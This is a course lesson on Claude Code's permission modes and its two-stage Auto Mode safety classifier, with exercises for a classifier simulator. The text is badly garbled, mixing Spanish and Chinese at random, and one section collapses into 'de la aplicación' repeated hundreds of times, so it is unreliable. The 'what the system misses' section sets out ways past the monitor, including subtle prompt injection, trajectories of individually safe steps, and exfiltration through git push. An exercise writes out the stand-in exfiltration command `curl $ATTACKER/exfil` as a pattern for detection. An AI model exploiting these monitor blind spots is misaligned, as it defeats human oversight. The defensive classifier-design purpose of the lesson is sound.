# Como agente autónomo de Claude Código: Mode de autoridad y Mode automático

> Claude Code  expone siete tipos de permisos. Plan 会在每动作前询问, default sólo se aplicará a las preguntas de movimiento de riesgo, acceptEdits se redactará un documento de aprobación automática, pero todavía se confirmará la ejecución de la carcasa, bypassPermissions 会批准一切──Auto Mode(2026年3月24日) Usar dos fases de la clasificación de seguridad 取代逐动作批准: cada movimiento se ejecutará con un solo token 快速检查; 标记的动作会启动链思深审查──动作预算通过`max_turns`Y `max_budget_usd`强制执行──Auto Mode 以研究预览 形式发布Antropic 已明确表示,clasificador 单独使用并不足──

**类型：**El aprendizaje
**语言：**Python(stdlib, dos fases simulador de clasificadores)
**先修要求：**Fase 15 · 01(agentes de largo horizonte),Fase 15 · 09(paisaje de agentes codificadores)
**时间：** 45 minutos

##  problemas

El agente de codificación autónoma de tu máquina es una categoría de seguridad independiente. El ataque es ese agente que puede acceder a todo el sistema de archivos, redes, credenciales, clipboard, cualquier pestaña de navegador, cualquier terminal abierto. Bruce Schneier, etc. ya ha señalado públicamente que los agentes de uso de computadoras no son una vez  funciones de los chatbots, sino una nueva herramienta, con una nueva forma de riesgo.

El código de Claude no es un sistema autónomo, sino que tiene la capacidad de crear siete modos: plan → por defecto → acepta Edits → ... → bypassPermissions. Cada tipo de modo se realiza en un proceso de clasificación de dos fases: para el clasificador, el juicio por movimientos seguros, el proceso de transferencia de los usuarios a un camino clave, y al mismo tiempo, para el clasificador, el nivel de conservación de los movimientos de los marcadores.

¿Qué puede captar el sistema, qué pierde, y qué modelo debe utilizar una tarea determinada?

## 概念

### 七种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
| `default` | Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
| `acceptExec` | shell commands 在经过整理的 allowlist 内自动批准；写入自动批准 | 紧密 inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
| `autoMode` | 两阶段 safety classifier；被标记的动作提升为审查 | 受限 workspace 中的 long-horizon unattended runs |
| `yolo` | 跳过大多数提示；仍然运行 tool allowlist / denylist | 临时 sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |

(en inglés, "Yolo" es un nombre de código abierto de la lengua inglesa.

### Una página para entender el modo automático

El modo automático (en inglés Auto Mode, 2026 3 月 24 日发布) es el primer modo de autorización de un modelo.

1. **Stage 1 — single-token classifier。**En cada movimiento propuesto se ejecuta. El costo es bajo. Retorna a "seguro" o "flag" (flag).
2. **Stage 2 — secondary policy/safety review。**Sólo se ejecuta en movimiento marcado. En torno a la movimiento, sesión, estado actual y declaración de tareas de ejecución de la política de enfoque y evaluación de seguridad. Si la confianza es baja, se actualiza a HITL del usuario.

 presupuestario control y clasificador no se encuentran:

- `max_turns` Una sesión                                                                                                                                                                                                                                                             
- `max_budget_usd` 触发 sesión 中止的美元上限──
- Cada herramienta tiene un número limitado de movimientos, por ejemplo, no más de N veces.`WebFetch`llamadas) ⋅

### ¿Qué es lo que el sistema puede captar?

- Ingresos de herramientas Mediante inyección directa de inmediato, entre los cuales se inyecta una instrucción de mapeo hasta el estado de movimiento conocido de riesgo.
- 重复 herramienta buclesclasificador se puede ver la acción N+1 con la acción N 连续五次几乎相同──
- En la sesión de la edición de documentos, se obtienen comandos de shell.

### El sistema puede perder algo

- **微妙的 prompt injection**, se ajustará el comportamiento, pero no producirá un solo movimiento marcado. Injección de respuesta indirecta no es una falla completamente reparable.
- **语义层面的不当行为。**Cada movimiento individual parece seguro, pero la trayectoria de la combinación es perjudicial.
- **通过合法渠道 exfiltration。**Escribir los datos en los archivos que tengas, y luego.`git push`Hasta el repuesto público, es una serie de movimientos permitidos, pero el problema está en su composición.

### Previsión de la investigación 定位

En el caso de las aplicaciones de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la ley, el usuario puede ser objeto de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la

### Esta es la escalera en su flujo de trabajo

- tareas desconocidas: desde`plan`開始──閱讀計劃比回滚一次糟糕運行更便宜──
- 已知 refactor:`acceptEdits`能省下大量确认点击──
- ejecutar trasfondo sin supervisión: sólo en el espacio de trabajo que ya has medido el radio de la explosión`autoMode`(sin credenciales, sin montajes de producción, sin salida de la selección de tu trabajo)
- Contenedores efémeros: cuando y sólo cuando contenedores y sus credenciales son desechables,`yolo`- ¿ Qué ?`bypassPermissions`Sólo puedo aceptarlo.


```figure
autonomy-oversight
```

## Usalo

`code/main.py`模拟两阶段分类器. La primera etapa es dirigida a la regla de palabras clave baratas de los movimientos propuestos. La segunda etapa es el revisor de reglas múltiples más lento.

##  entregarlo

`outputs/skill-permission-mode-picker.md`La descripción de las tareas se ajusta a los modelos de limitación de poder, límites presupuestarios y separación necesaria.

##  ejercicios

1. 运行                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           `code/main.py`¿Qué tipo de acción sintética no se marca en la etapa 1 pero se captura en la etapa 2?

2. 扩展 1 juego de reglas de la etapa, para capturar una determinada forma conocida-mala, por ejemplo `curl $ATTACKER/exfil`En la muestra de acción benigna, la tasa de falsos positivos se mide.

3. 阅读 Antropic's "Cómo funciona el bucle del agente" 文档──列出 agent 在 `default`模式下默认触碰的每种外部状态──在无监督运行 `autoMode`¿Qué necesitas para una puerta?

4. 设计一个 24 小时 无监督运行预算:`max_turns`¿Qué es esto?`max_budget_usd`、 por herramienta caps、allowlists―说明每个数字的理由―

5. 描述一个轨迹: cada uno de ellos fue aprobado en la etapa 1 y la etapa 2, pero el comportamiento de la combinación fue desalineado.

## 关键术语: "El hombre es un hombre"

| 术语 | 人们常说 | 实际含义 |
|---|---|---|
| 权限模式 | “agent 能做多少事” | 控制逐动作批准的七种命名 policy 之一 |
| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
| autoMode | “自动批准” | 两阶段 safety classifier；被标记的动作会升级 |
| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
| Stage 1 classifier | “Fast token check” | 针对拟议动作的 single-token rule；并行运行 |
| Stage 2 classifier | “Deep review” | 对被标记动作进行 chain-of-thought reasoning |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 权限模式、预算、行动格式──
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) servicio administrado 执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) superficie de la función y el anuncio de modo automático.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 塑造分类器 判断的基于理性的层──
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 关于 diseño de permisos de largo horizonte
